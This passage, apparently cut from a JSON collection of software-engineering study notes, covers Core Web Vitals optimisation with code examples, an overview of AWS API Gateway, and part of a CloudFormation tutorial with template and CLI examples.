loss\n- **Business Metrics:** Better performance = higher engagement and conversions\n\n### The Three Core Web Vitals\n\nGoogle prioritizes three metrics that represent the complete user experience:\n\n1. **LCP (Largest Contentful Paint)** - Loading performance\n2. **INP (Interaction to Next Paint)** - Responsiveness\n3. **CLS (Cumulative Layout Shift)** - Visual stability\n\n## Detailed Metrics Breakdown\n\n### 1. Largest Contentful Paint (LCP)\n\n**What it measures:** Time until the largest visible content element (image, video, or text block) is rendered on screen.\n\n```\nTimeline:\n0ms ────────────────────── 2500ms ─────────────── 4000ms ──────────→\n     [Hero image loads]      ↑                      ↑\n                            Good                   Poor\n                          (< 2.5s)               (> 4.0s)\n\nGood: < 2.5 seconds\nNeeds Improvement: 2.5 - 4.0 seconds\nPoor: > 4.0 seconds\n```\n\n**What counts as LCP:**\n- `<img>` elements\n- `<image>` elements inside `<svg>`\n- `<video>` elements (poster image)\n- Background images loaded via CSS `url()`\n- Block-level text elements (paragraphs, headings)\n\n**Example scenario:**\n```html\n<!-- This hero image is likely your LCP element -->\n<section class=\"hero\">\n  <img src=\"hero-banner.jpg\" alt=\"Hero\" />  <!-- LCP candidate -->\n  <h1>Welcome to Our Site</h1>\n</section>\n\n<!-- Not counted (too small or not visible) -->\n<header>\n  <img src=\"logo.png\" alt=\"Logo\" />  <!-- Usually too small -->\n</header>\n```\n\n**Common causes of poor LCP:**\n- Large, unoptimized images (5MB image when 200KB would suffice)\n- Slow server response times (TTFB > 600ms)\n- Render-blocking JavaScript and CSS\n- Client-side rendering (React/Vue without SSR)\n\n**How to improve:**\n```html\n<!-- ❌ Bad: Large unoptimized image -->\n<img src=\"hero.jpg\" />\n\n<!-- ✅ Good: Optimized, modern formats, priority hint -->\n<img \n  src=\"hero.webp\"\n  srcset=\"hero-400.webp 400w, hero-800.webp 800w, hero-1200.webp 1200w\"\n  sizes=\"(max-width: 600px) 400px, (max-width: 1200px) 800px, 1200px\"\n  alt=\"Hero\"\n  loading=\"eager\"\n  fetchpriority=\"high\"\n/>\n\n<!-- Preload critical images -->\n<link rel=\"preload\" as=\"image\" href=\"hero.webp\" />\n```\n\n### 2. Interaction to Next Paint (INP)\n\n**What it measures:** Time from user interaction (click, tap, keystroke) until the browser paints the next frame showing visual feedback.\n\n```\nUser clicks button → [Processing] → Visual update appears\n                     ←─ INP ─→\n\nGood: < 200ms\nNeeds Improvement: 200 - 500ms\nPoor: > 500ms\n```\n\n**Example interactions:**\n- Clicking a button to open a menu\n- Typing in a search box\n- Tapping a card to expand details\n- Selecting a checkbox\n\n**Common causes of poor INP:**\n- Heavy JavaScript execution blocking the main thread\n- Long-running event handlers\n- Large DOM updates\n- Excessive re-renders in React/Vue\n\n**How to improve:**\n```javascript\n// ❌ Bad: Blocking the main thread\nbutton.addEventListener('click', () => {\n  // Processes 10,000 items synchronously\n  const result = processLargeDataset(data);\n  updateUI(result);\n});\n\n// ✅ Good: Break work into chunks\nbutton.addEventListener('click', async () => {\n  // Show immediate feedback\n  button.classList.add('loading');\n  \n  // Yield to main thread\n  await new Promise(resolve => setTimeout(resolve, 0));\n  \n  // Process in chunks\n  const result = await processInChunks(data);\n  updateUI(result);\n  button.classList.remove('loading');\n});\n\n// ✅ Good: Use Web Workers for heavy computation\nbutton.addEventListener('click', () => {\n  const worker = new Worker('process-worker.js');\n  worker.postMessage(data);\n  \n  worker.onmessage = (e) => {\n    updateUI(e.data);\n  };\n});\n\n// ✅ Good: Debounce rapid inputs\nconst searchInput = document.getElementById('search');\nconst debouncedSearch = debounce((value) => {\n  performSearch(value);\n}, 300);\n\nsearchInput.addEventListener('input', (e) => {\n  debouncedSearch(e.target.value);\n});\n```\n\n### 3. Cumulative Layout Shift (CLS)\n\n**What it measures:** Sum of all unexpected layout shifts that occur during the page's lifetime. A layout shift happens when visible elements change position.\n\n```\nGood: < 0.1\nNeeds Improvement: 0.1 - 0.25\nPoor: > 0.25\n\nCLS Score = (Impact Fraction) × (Distance Fraction)\n```\n\n**Visual example:**\n```\nUser about to click \"Accept\"\n┌──────────────────┐\n│  [Accept]        │  ← Button is here\n└──────────────────┘\n\nAd loads, button shifts down\n┌──────────────────┐\n│  [Advertisement] │  ← Ad appears\n│  [Accept]        │  ← Button moved (user clicks ad by accident!)\n└──────────────────┘\n\nResult: Poor user experience, layout shift recorded\n```\n\n**Common causes of poor CLS:**\n- Images without dimensions (browser doesn't know how much space to reserve)\n- Ads, embeds, or iframes without reserved space\n- Fonts loading and changing text size (FOIT/FOUT)\n- Content injected above existing content\n\n**How to fix:**\n```html\n<!-- ❌ Bad: No dimensions, causes layout shift -->\n<img src=\"product.jpg\" alt=\"Product\" />\n\n<!-- ✅ Good: Explicit dimensions prevent shift -->\n<img \n  src=\"product.jpg\" \n  alt=\"Product\"\n  width=\"800\"\n  height=\"600\"\n  style=\"aspect-ratio: 4/3;\"\n/>\n\n<!-- ❌ Bad: Ad slot without reserved space -->\n<div id=\"ad-slot\"></div>\n\n<!-- ✅ Good: Reserve space for ad -->\n<div id=\"ad-slot\" style=\"min-height: 250px;\">\n  <!-- Ad loads here -->\n</div>\n\n<!-- ✅ Good: Font loading strategy -->\n<style>\n  @font-face {\n    font-family: 'CustomFont';\n    src: url('font.woff2') format('woff2');\n    font-display: swap; /* Or 'optional' to prevent layout shift */\n  }\n</style>\n```\n\n### 4. First Contentful Paint (FCP)\n\n**What it measures:** Time when the first DOM content (text, image, SVG) is rendered on screen.\n\n```\nTimeline:\n0ms ───────────── 1800ms ────────────── 3000ms ──────────→\n    [First pixel]    ↑                    ↑\n                   Good                  Poor\n                 (< 1.8s)              (> 3.0s)\n\nGood: < 1.8 seconds\nNeeds Improvement: 1.8 - 3.0 seconds\nPoor: > 3.0 seconds\n```\n\n**What counts:**\n- First text rendered\n- First image rendered\n- First SVG element\n- Non-white `<canvas>` elements\n\n**Difference from LCP:**\n- **FCP:** First *anything* appears (\"page is loading\")\n- **LCP:** Main content appears (\"page is useful\")\n\n### 5. Time to First Byte (TTFB)\n\n**What it measures:** Time from navigation start until the browser receives the first byte of the response.\n\n```\nUser clicks link → [DNS] → [Connection] → [Server Processing] → First byte received\n                  ←────────────── TTFB ─────────────────────→\n\nGood: < 800ms\nNeeds Improvement: 800 - 1800ms\nPoor: > 1800ms\n```\n\n**What affects TTFB:**\n- Server processing time\n- Database query performance\n- Network latency\n- CDN effectiveness\n\n**How to improve:**\n```javascript\n// ❌ Bad: Slow server-side processing\napp.get('/api/products', async (req, res) => {\n  const products = await db.query('SELECT * FROM products');\n  const enriched = await enrichProductsWithDetails(products); // Slow!\n  res.json(enriched);\n});\n\n// ✅ Good: Optimized queries and caching\napp.get('/api/products', async (req, res) => {\n  const cacheKey = 'products:all';\n  const cached = await cache.get(cacheKey);\n  \n  if (cached) {\n    return res.json(cached);\n  }\n  \n  const products = await db.query(\n    'SELECT * FROM products WHERE active = true LIMIT 50'\n  );\n  \n  await cache.set(cacheKey, products, { ttl: 300 }); // 5 min cache\n  res.json(products);\n});\n\n// ✅ Good: Use CDN for static assets\n// Instead of: https://yourserver.com/logo.png\n// Use: https://cdn.yoursite.com/logo.png\n```\n\n## Similarities Between Metrics\n\nAll web performance metrics share common characteristics:\n\n### 1. User-Centric Focus\n\nAll metrics measure real user experience, not just technical benchmarks.\n\n```javascript\n// All metrics reflect what users actually experience\nLCP: \"When can I see the main content?\"\nINP: \"Is the page responding to my clicks?\"\nCLS: \"Is the page stable or jumping around?\"\nFCP: \"Is anything happening?\"\n```\n\n### 2. Measured in Real User Monitoring (RUM)\n\nAll metrics should be tracked with real user data, not just lab testing.\n\n```javascript\n// Using web-vitals library\nimport { onLCP, onINP, onCLS } from 'web-vitals';\n\nonLCP((metric) => {\n  console.log('LCP:', metric.value);\n  sendToAnalytics({ metric: 'LCP', value: metric.value });\n});\n\nonINP((metric) => {\n  console.log('INP:', metric.value);\n  sendToAnalytics({ metric: 'INP', value: metric.value });\n});\n\nonCLS((metric) => {\n  console.log('CLS:', metric.value);\n  sendToAnalytics({ metric: 'CLS', value: metric.value });\n});\n```\n\n### 3. Measurable with Browser APIs\n\nAll metrics use the Performance API under the hood.\n\n```javascript\n// Performance Observer API (basis for all metrics)\nconst observer = new PerformanceObserver((list) => {\n  for (const entry of list.getEntries()) {\n    console.log(entry.name, entry.startTime);\n  }\n});\n\nobserver.observe({ entryTypes: ['paint', 'largest-contentful-paint'] });\n```\n\n### 4. Impact SEO and Rankings\n\nGoogle uses all Core Web Vitals as ranking signals.\n\n```\nGood Core Web Vitals = Better search rankings\nPoor Core Web Vitals = Lower search rankings\n\nAll three must be \"Good\" for maximum SEO benefit\n```\n\n## Differences Between Metrics\n\n### 1. What They Measure\n\n```\nLCP:  Loading performance (time-based)\n      → \"How long until main content appears?\"\n\nINP:  Responsiveness (time-based)\n      → \"How long until page responds to clicks?\"\n\nCLS:  Visual stability (score-based, not time)\n      → \"How much does the layout shift?\"\n\nFCP:  First paint (time-based)\n      → \"How long until anything appears?\"\n\nTTFB: Server performance (time-based)\n      → \"How long until server responds?\"\n```\n\n### 2. When They're Measured\n\n```\nTimeline:\n0ms ─── TTFB ─── FCP ─────── LCP ────────────────────────→\n         ↑        ↑           ↑              ↑\n       Server   First     Main content   Throughout\n      responds  pixel      appears      page lifetime\n                                            ↑\n                                         INP & CLS\n                                     (measured ongoing)\n```\n\n### 3. Units of Measurement\n\n```javascript\n// Time-based metrics (milliseconds)\nLCP: 2300  // 2.3 seconds\nINP: 150   // 150 milliseconds\nFCP: 1200  // 1.2 seconds\nTTFB: 400  // 400 milliseconds\n\n// Score-based metric (unitless)\nCLS: 0.05  // Lower is better (not time)\n```\n\n### 4. What Causes Poor Scores\n\n```\nLCP issues:\n- Large unoptimized images\n- Slow server response\n- Render-blocking resources\n\nINP issues:\n- Heavy JavaScript on main thread\n- Large DOM updates\n- Unoptimized event handlers\n\nCLS issues:\n- Images without dimensions\n- Dynamic content injection\n- Web fonts causing reflow\n\nTTFB issues:\n- Slow server processing\n- No caching\n- Poor network infrastructure\n```\n\n### 5. How to Fix Them\n\n```javascript\n// LCP: Optimize resources\n<link rel=\"preload\" as=\"image\" href=\"hero.jpg\" />\n<img loading=\"eager\" fetchpriority=\"high\" src=\"hero.jpg\" />\n\n// INP: Optimize JavaScript\n// Break up long tasks, use web workers, debounce inputs\n\n// CLS: Reserve space\n<img width=\"800\" height=\"600\" src=\"image.jpg\" />\n<div style=\"min-height: 250px;\" id=\"ad-slot\"></div>\n\n// TTFB: Optimize server\n// Use caching, CDN, optimize database queries\n```\n\n## Common Pitfalls\n\n- Optimizing for lab scores only (use real user data)\n- Ignoring mobile performance (often worse than desktop)\n- Not setting image dimensions (causes CLS)\n- Loading too many third-party scripts (impacts all metrics)\n- Not measuring after deployment (metrics change in production)\n- Focusing on one metric while ignoring others\n\n## Practical Applications\n\n- E-commerce sites (faster LCP = higher conversions)\n- News/media sites (good CLS prevents accidental clicks)\n- SaaS applications (good INP = better user experience)\n- Mobile-first sites (all metrics critical on slower connections)\n- SEO optimization (Core Web Vitals affect rankings)\n\n## References\n\n- [Web Vitals Official Site](https://web.dev/vitals/)\n- [Chrome User Experience Report](https://developers.google.com/web/tools/chrome-user-experience-report)\n- [PageSpeed Insights](https://pagespeed.web.dev/)\n- [Lighthouse Documentation](https://developer.chrome.com/docs/lighthouse/)\n- [web-vitals JavaScript Library](https://github.com/GoogleChrome/web-vitals)\n\n---\n\n## Greater Detail\n\n### Measuring Metrics in Your Application\n\n```javascript\n// Install: npm install web-vitals\n\n// measure.js\nimport { onLCP, onINP, onCLS, onFCP, onTTFB } from 'web-vitals';\n\nfunction sendToAnalytics({ name, value, rating, id }) {\n  // Send to your analytics service\n  fetch('/analytics', {\n    method: 'POST',\n    body: JSON.stringify({\n      metric: name,\n      value: value,\n      rating: rating, // 'good', 'needs-improvement', 'poor'\n      id: id,\n      url: window.location.href,\n      userAgent: navigator.userAgent\n    })\n  });\n}\n\n// Measure all Core Web Vitals\nonLCP(sendToAnalytics);\nonINP(sendToAnalytics);\nonCLS(sendToAnalytics);\nonFCP(sendToAnalytics);\nonTTFB(sendToAnalytics);\n\n// Example output:\n// { name: 'LCP', value: 2340, rating: 'good' }\n// { name: 'INP', value: 156, rating: 'good' }\n// { name: 'CLS', value: 0.02, rating: 'good' }\n```\n\n### Real-World Optimization Example\n\n```javascript\n// Before: Poor LCP (5.2s), Poor CLS (0.32)\n\n// ❌ Problems:\n// - Large hero image (3MB)\n// - No image dimensions\n// - Render-blocking CSS\n// - Ads loaded without space reservation\n\n// HTML Before\n<head>\n  <link rel=\"stylesheet\" href=\"styles.css\" />\n  <script src=\"analytics.js\"></script>\n</head>\n<body>\n  <img src=\"hero-original.jpg\" alt=\"Hero\" />\n  <div id=\"ad-slot\"></div>\n</body>\n\n// After: Good LCP (1.8s), Good CLS (0.04)\n\n// ✅ Solutions:\n<head>\n  <!-- Critical CSS inline -->\n  <style>\n    /* Critical above-the-fold styles */\n    .hero { min-height: 400px; }\n  </style>\n  \n  <!-- Preload LCP image -->\n  <link rel=\"preload\" as=\"image\" href=\"hero-optimized.webp\" />\n  \n  <!-- Defer non-critical CSS -->\n  <link rel=\"preload\" as=\"style\" href=\"styles.css\" \n        onload=\"this.rel='stylesheet'\" />\n  \n  <!-- Defer analytics -->\n  <script defer src=\"analytics.js\"></script>\n</head>\n<body>\n  <!-- Optimized image with dimensions -->\n  <img \n    src=\"hero-optimized.webp\"\n    srcset=\"hero-400.webp 400w, hero-800.webp 800w\"\n    sizes=\"(max-width: 768px) 400px, 800px\"\n    alt=\"Hero\"\n    width=\"800\"\n    height=\"400\"\n    loading=\"eager\"\n    fetchpriority=\"high\"\n  />\n  \n  <!-- Reserved space for ad -->\n  <div id=\"ad-slot\" style=\"min-height: 250px; background: #f0f0f0;\">\n    <!-- Ad loads here -->\n  </div>\n</body>\n\n// Results:\n// LCP: 5.2s → 1.8s (65% improvement)\n// CLS: 0.32 → 0.04 (87% improvement)\n```\n\n### Performance Monitoring Dashboard\n\n```typescript\n// analytics.ts - Track metrics over time\n\ninterface MetricData {\n  metric: string;\n  value: number;\n  rating: 'good' | 'needs-improvement' | 'poor';\n  timestamp: number;\n  url: string;\n  device: 'mobile' | 'desktop';\n}\n\nclass PerformanceMonitor {\n  private metrics: MetricData[] = [];\n  \n  track(data: Omit<MetricData, 'timestamp' | 'device'>) {\n    const metricData: MetricData = {\n      ...data,\n      timestamp: Date.now(),\n      device: this.getDeviceType()\n    };\n    \n    this.metrics.push(metricData);\n    this.sendToBackend(metricData);\n  }\n  \n  private getDeviceType(): 'mobile' | 'desktop' {\n    return /mobile|android|iphone/i.test(navigator.userAgent)\n      ? 'mobile'\n      : 'desktop';\n  }\n  \n  private async sendToBackend(data: MetricData) {\n    try {\n      await fetch('/api/metrics', {\n        method: 'POST',\n        headers: { 'Content-Type': 'application/json' },\n        body: JSON.stringify(data)\n      });\n    } catch (error) {\n      console.error('Failed to send metrics:', error);\n    }\n  }\n  \n  getAverages() {\n    const grouped = this.metrics.reduce((acc, m) => {\n      if (!acc[m.metric]) acc[m.metric] = [];\n      acc[m.metric].push(m.value);\n      return acc;\n    }, {} as Record<string, number[]>);\n    \n    return Object.entries(grouped).map(([metric, values]) => ({\n      metric,\n      average: values.reduce((a, b) => a + b) / values.length,\n      count: values.length\n    }));\n  }\n}\n\n// Usage\nconst monitor = new PerformanceMonitor();\n\nonLCP((metric) => {\n  monitor.track({\n    metric: 'LCP',\n    value: metric.value,\n    rating: metric.rating,\n    url: window.location.href\n  });\n});\n\n// After some time\nconsole.log(monitor.getAverages());\n// [\n//   { metric: 'LCP', average: 2145, count: 50 },\n//   { metric: 'INP', average: 123, count: 50 },\n//   { metric: 'CLS', average: 0.03, count: 50 }\n// ]\n```\n\n### Framework-Specific Optimizations\n\n```javascript\n// React: Optimize for INP\nimport { useState, useTransition } from 'react';\n\nfunction SearchComponent() {\n  const [query, setQuery] = useState('');\n  const [results, setResults] = useState([]);\n  const [isPending, startTransition] = useTransition();\n  \n  const handleSearch = (value: string) => {\n    setQuery(value); // Immediate update\n    \n    // Mark expensive update as non-urgent\n    startTransition(() => {\n      const filtered = expensiveFilter(data, value);\n      setResults(filtered);\n    });\n  };\n  \n  return (\n    <input \n      value={query}\n      onChange={(e) => handleSearch(e.target.value)}\n      disabled={isPending}\n    />\n  );\n}\n\n// Next.js: Optimize for LCP\nimport Image from 'next/image';\n\nexport default function Hero() {\n  return (\n    <Image\n      src=\"/hero.jpg\"\n      alt=\"Hero\"\n      width={1200}\n      height={600}\n      priority  // Loads with high priority\n      placeholder=\"blur\"  // Shows blur while loading\n    />\n  );\n}\n\n// Vue: Optimize for CLS\n<template>\n  <img \n    :src=\"imageSrc\"\n    :width=\"800\"\n    :height=\"600\"\n    :style=\"{ aspectRatio: '4/3' }\"\n    alt=\"Product\"\n  />\n</template>\n```\n\n### Testing Metrics Locally\n\n```bash\n# Using Lighthouse CLI\nnpm install -g lighthouse\n\n# Test your site\nlighthouse https://yoursite.com --view\n\n# Output includes all Core Web Vitals with scores\n\n# Using PageSpeed Insights API\ncurl \"https://www.googleapis.com/pagespeedonline/v5/runPagespeed?url=https://yoursite.com&strategy=mobile\"\n\n# Chrome DevTools\n# 1. Open DevTools (F12)\n# 2. Go to Lighthouse tab\n# 3. Click \"Analyze page load\"\n# 4. View Core Web Vitals report\n```\n\n### Best Practices Summary\n\n```typescript\n// ✅ Optimize LCP:\n// 1. Use optimized image formats (WebP, AVIF)\n// 2. Implement lazy loading (except LCP image)\n// 3. Use CDN for faster delivery\n// 4. Preload critical resources\n// 5. Minimize server response time\n\n// ✅ Optimize INP:\n// 1. Break up long tasks (use setTimeout, requestIdleCallback)\n// 2. Debounce/throttle frequent events\n// 3. Use Web Workers for heavy computation\n// 4. Minimize JavaScript execution time\n// 5. Avoid synchronous layout recalculations\n\n// ✅ Optimize CLS:\n// 1. Always specify image dimensions\n// 2. Reserve space for dynamic content\n// 3. Use font-display: optional for web fonts\n// 4. Avoid inserting content above existing content\n// 5. Use transform animations (not top/left)\n\n// ✅ Optimize TTFB:\n// 1. Use CDN\n// 2. Implement caching (Redis, CDN cache)\n// 3. Optimize database queries\n// 4. Use HTTP/2 or HTTP/3\n// 5. Enable compression (Gzip, Brotli)\n\n// ✅ General best practices:\n// 1. Measure real user data, not just lab data\n// 2. Test on real devices (especially mobile)\n// 3. Monitor continuously, not just once\n// 4. Set performance budgets\n// 5. Automate testing in CI/CD\n```"
    },
    {
      "id": "swe/aws-cloud/aws-api-gateway",
      "title": "AWS API Gateway: Your Cloud's Front Door",
      "path": [
        "swe",
        "aws-cloud",
        "aws-api-gateway"
      ],
      "content": "# AWS API Gateway: Your Cloud's Front Door\n\nAWS API Gateway is a fully managed service that acts as the entry point for your applications to access backend services. Think of it as a **smart receptionist** for your cloud infrastructure—it receives requests, routes them to the right place, and handles all the coordination in between.\n\n## What Problem Does It Solve?\n\nImagine you're building an app that needs to talk to multiple services: a database, authentication system, payment processor, and notification service. Without API Gateway, you'd need to:\n- Manage connections to each service individually\n- Handle authentication and security for every endpoint\n- Monitor and throttle traffic manually\n- Deal with different protocols and data formats\n\nAPI Gateway centralizes all of this, giving you one unified interface.\n\n## Core Features\n\n**Request Routing**: Directs incoming API calls to the appropriate backend—whether that's Lambda functions, EC2 instances, or other AWS services.\n\n**Authentication & Authorization**: Integrates with AWS IAM, Cognito, and custom authorizers. It's like having a bouncer who checks IDs before anyone gets in.\n\n**Throttling & Rate Limiting**: Protects your backend from being overwhelmed. Set limits like \"1000 requests per second\" to prevent abuse or accidental overload.\n\n**Caching**: Stores frequently requested responses temporarily, reducing load on your backend and improving response times.\n\n**Request/Response Transformation**: Converts data formats on the fly. Your frontend can send JSON while your legacy backend expects XML—API Gateway handles the translation.\n\n## Types of APIs\n\n**REST APIs**: Traditional request-response model. Good for standard CRUD operations.\n\n**HTTP APIs**: Simpler, cheaper version of REST APIs. About 70% less expensive with lower latency, but fewer features.\n\n**WebSocket APIs**: Enables two-way, real-time communication. Perfect for chat apps, live dashboards, or gaming.\n\n## Real-World Example\n\nSay you're building a food delivery app:\n```\nMobile App → API Gateway → Lambda (order processing)\n                        → DynamoDB (store order)\n                        → SNS (notify restaurant)\n```\n\nAPI Gateway receives the order, authenticates the user, validates the request format, routes it to Lambda, and returns the response—all while logging the transaction and applying rate limits to prevent spam orders.\n\n## Pricing Model\n\nYou pay for:\n- Number of API calls (per million requests)\n- Data transfer out\n- Optional features like caching\n\nHTTP APIs are significantly cheaper than REST APIs, so choose based on your feature needs.\n\n## Common Use Cases\n\n**Microservices Architecture**: Acts as the single entry point for distributed services.\n\n**Serverless Applications**: Pairs naturally with Lambda for event-driven architectures.\n\n**Mobile Backends**: Handles authentication, throttling, and API versioning for mobile apps.\n\n**Legacy Modernization**: Provides a modern API layer in front of older systems without modifying them.\n\n## Best Practices\n\nSet up **API keys** for third-party developers accessing your API. Use **stages** (dev, staging, prod) to test changes safely before going live. Enable **CloudWatch logging** for debugging and monitoring. Implement **CORS** properly if your API serves web applications.\n\n## The Bottom Line\n\nAPI Gateway removes the undifferentiated heavy lifting of API management. Instead of building your own authentication, monitoring, and scaling infrastructure, you get a production-ready solution that scales automatically. For serverless and microservices architectures, it's often the first AWS service you'll configure—the literal gateway to your cloud resources."
    },
    {
      "id": "swe/aws-cloud/aws-cloud-formation",
      "title": "AWS CloudFormation: Complete Overview",
      "path": [
        "swe",
        "aws-cloud",
        "aws-cloud-formation"
      ],
      "content": "# AWS CloudFormation: Complete Overview\n\nAWS CloudFormation is an Infrastructure as Code (IaC) service that lets you define and provision AWS resources using declarative templates written in YAML or JSON. Instead of manually clicking through the AWS console, you describe your entire infrastructure in a template file, and CloudFormation creates, updates, and deletes resources in the correct order. Think of it as a recipe for your infrastructure—you write down all the ingredients (resources) and instructions (configurations), and CloudFormation cooks up your environment exactly as specified.\n\n## Key Points\n\n- **Purpose:** Automate AWS infrastructure provisioning with code\n- **Format:** Templates written in YAML (preferred) or JSON\n- **Stacks:** A collection of resources created from a single template\n- **Declarative:** You describe WHAT you want, not HOW to create it\n- **State Management:** CloudFormation tracks resource state automatically\n\n## Step-by-Step Explanation & Examples\n\n1. **Basic Template Structure**\n\n   ```yaml\n   AWSTemplateFormatVersion: '2010-09-09'\n   Description: My first CloudFormation template\n   \n   Parameters:\n     # Input values passed at stack creation\n   \n   Mappings:\n     # Static lookup tables\n   \n   Conditions:\n     # Conditional logic for resource creation\n   \n   Resources:\n     # AWS resources to create (required)\n   \n   Outputs:\n     # Values to export/display after creation\n   ```\n\n2. **Simple S3 Bucket**\n\n   ```yaml\n   AWSTemplateFormatVersion: '2010-09-09'\n   Description: Create an S3 bucket\n   \n   Resources:\n     MyBucket:\n       Type: AWS::S3::Bucket\n       Properties:\n         BucketName: my-unique-bucket-name-12345\n         VersioningConfiguration:\n           Status: Enabled\n         Tags:\n           - Key: Environment\n             Value: Production\n   \n   Outputs:\n     BucketArn:\n       Description: ARN of the created bucket\n       Value: !GetAtt MyBucket.Arn\n   ```\n\n3. **Using Parameters (Dynamic Inputs)**\n\n   ```yaml\n   Parameters:\n     EnvironmentType:\n       Type: String\n       Default: dev\n       AllowedValues:\n         - dev\n         - staging\n         - prod\n       Description: Environment type\n     \n     InstanceType:\n       Type: String\n       Default: t3.micro\n       AllowedValues:\n         - t3.micro\n         - t3.small\n         - t3.medium\n   \n   Resources:\n     WebServer:\n       Type: AWS::EC2::Instance\n       Properties:\n         InstanceType: !Ref InstanceType\n         ImageId: ami-0abcdef1234567890\n         Tags:\n           - Key: Environment\n             Value: !Ref EnvironmentType\n   ```\n   \n   **Deploy:** `aws cloudformation create-stack --stack-name my-stack --template-body file://template.yaml --parameters ParameterKey=EnvironmentType,ParameterValue=prod`\n\n4. **Intrinsic Functions (Built-in Helpers)**\n\n   ```yaml\n   Resources:\n     MyBucket:\n       Type: AWS::S3::Bucket\n       Properties:\n         # !Ref - Reference parameter or resource\n         BucketName: !Ref BucketNameParam\n         \n     MyLambda:\n       Type: AWS::Lambda::Function\n       Properties:\n         FunctionName: !Sub '${EnvironmentType}-my-function'  # String substitution\n         \n         # !GetAtt - Get attribute from another resource\n         Environment:\n           Variables:\n             BUCKET_ARN: !GetAtt MyBucket.Arn\n         \n         # !Join - Concatenate strings\n         Description: !Join\n           - ' '\n           - - 'Lambda for'\n             - !Ref EnvironmentType\n             - 'environment'\n   \n   Outputs:\n     # !If - Conditional value\n     Endpoint:\n       Value: !If [IsProd, 'https://api.example.com', 'https://dev-api.example.com']\n   ```\n\n5. **VPC with Public/Private Subnets**\n\n   ```yaml\n   Resources:\n     VPC:\n       Type: AWS::EC2::VPC\n       Properties:\n         CidrBlock: 10.0.0.0/16\n         EnableDnsHostnames: true\n         Tags:\n           - Key: Name\n             Value: !Sub '${AWS::StackName}-vpc'\n     \n     PublicSubnet:\n       Type: AWS::EC2::Subnet\n       Properties:\n         VpcId: !Ref VPC\n         CidrBlock: 10.0.1.0/24\n         AvailabilityZone: !Select [0, !GetAZs '']\n         MapPublicIpOnLaunch: true\n     \n     PrivateSubnet:\n       Type: AWS::EC2::Subnet\n       Properties:\n         VpcId: !Ref VPC\n         CidrBlock: 10.0.2.0/24\n         AvailabilityZone: !Select [0, !GetAZs '']\n     \n     InternetGateway:\n       Type: AWS::EC2::InternetGateway\n     \n     AttachGateway:\n       Type: AWS::EC2::VPCGatewayAttachment\n       Properties:\n         VpcId: !Ref VPC\n         InternetGatewayId: !Ref InternetGateway\n     \n     PublicRouteTable:\n       Type: AWS::EC2::RouteTable\n       Properties:\n         VpcId: !Ref VPC\n     \n     PublicRoute:\n       Type: AWS::EC2::Route\n       DependsOn: AttachGateway\n       Properties:\n         RouteTableId: !Ref PublicRouteTable\n         DestinationCidrBlock: 0.0.0.0/0\n         GatewayId: !Ref InternetGateway\n   ```\n\n6. **Conditions (Environment-Based Logic)**\n\n   ```yaml\n   Parameters:\n     EnvironmentType:\n       Type: String\n       AllowedValues: [dev, prod]\n   \n   Conditions:\n     IsProd: !Equals [!Ref EnvironmentType, prod]\n     IsDev: !Not [!Equals [!Ref EnvironmentType, prod]]\n   \n   Resources:\n     ProdDatabase:\n       Type: AWS::RDS::DBInstance\n       Condition: IsProd  # Only created in prod\n       Properties:\n         DBInstanceClass: db.r5.large\n         MultiAZ: true\n     \n     DevDatabase:\n       Type: AWS::RDS::DBInstance\n       Condition: IsDev  # Only created in dev\n       Properties:\n         DBInstanceClass: db.t3.micro\n         MultiAZ: false\n   ```\n\n## Common Pitfalls\n\n- Hardcoding values instead of using parameters (not reusable)\n- Circular dependencies between resources (stack creation fails)\n- Forgetting `DependsOn` when implicit dependencies aren't detected\n- Not using `!Sub` for string interpolation (cleaner than `!Join`)\n- Deleting resources manually that are managed by CloudFormation (drift)\n- Not enabling termination protection on production stacks\n- Ignoring stack events when debugging failures (shows exact error)\n- Using resource names that must be globally unique (S3 buckets)\n\n## Practical Applications\n\n- Repeatable environment provisioning (dev, staging, prod from same template)\n- Multi-region deployments (StackSets)\n- Disaster recovery (rebuild infrastructure from templates)\n- Compliance and auditing (infrastructure defined in version control)\n- CI/CD pipelines (automated infrastructure updates)\n\n## References\n\n- [AWS CloudFormation User Guide](https://docs.aws.amazon.com/cloudformation/)\n- [CloudFormation Resource Reference](https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-template-resource-type-ref.html)\n- [Intrinsic Functions Reference](https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/intrinsic-function-reference.html)\n- [AWS CloudFormation Best Practices](https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/best-practices.html)\n- [cfn-lint](https://github.com/aws-cloudformation/cfn-lint) - Template validator\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Stack Lifecycle:**\n  ```\n  CREATE_IN_PROGRESS → CREATE_COMPLETE (success)\n                     → CREATE_FAILED → ROLLBACK_IN_PROGRESS → ROLLBACK_COMPLETE\n  \n  UPDATE_IN_PROGRESS → UPDATE_COMPLETE (success)\n                     → UPDATE_FAILED → UPDATE_ROLLBACK_IN_PROGRESS → UPDATE_ROLLBACK_COMPLETE\n  \n  DELETE_IN_PROGRESS → DELETE_COMPLETE (success)\n                     → DELETE_FAILED (manual intervention needed)\n  \n  Debugging: Check \"Events\" tab for specific resource failures\n  ```\n\n- **Change Sets (Preview Before Update):**\n  ```bash\n  # Create change set\n  aws cloudformation create-change-set \\\n    --stack-name my-stack \\\n    --template-body file://updated-template.yaml \\\n    --change-set-name my-changes\n  \n  # Review changes\n  aws cloudformation describe-change-set \\\n    --stack-name my-stack \\\n    --change-set-name my-changes\n  \n  # Execute if changes look good\n  aws cloudformation execute-change-set \\\n    --stack-name my-stack \\\n    --change-set-name my-changes\n  \n  Shows: Add, Modify, Remove actions per resource\n  ```\n\n- **Nested Stacks (Modular Templates):**\n  ```yaml\n  # Parent template (main.yaml)\n  Resources:\n    VPCStack:\n      Type: AWS::CloudFormation::Stack\n      Properties:\n        TemplateURL: https://s3.amazonaws.com/mybucket/vpc.yaml\n        Parameters:\n          Environment: !Ref Environment\n    \n    AppStack:\n      Type: AWS::CloudFormation::Stack\n      DependsOn: VPCStack\n      Properties:\n        TemplateURL: https://s3.amazonaws.com/mybucket/app.yaml\n        Parameters:\n          VpcId: !GetAtt VPCStack.Outputs.VpcId\n  \n  Benefits:\n  - Reusable components\n  - Overcome 500 resource limit per stack\n  - Separate concerns (networking, compute, database)\n  ```\n\n- **Cross-Stack References (Exports/Imports):**\n  ```yaml\n  # Stack A: VPC Stack\n  Outputs:\n    VpcId:\n      Description: VPC ID for other stacks\n      Value: !Ref VPC\n      Export:\n        Name: !Sub 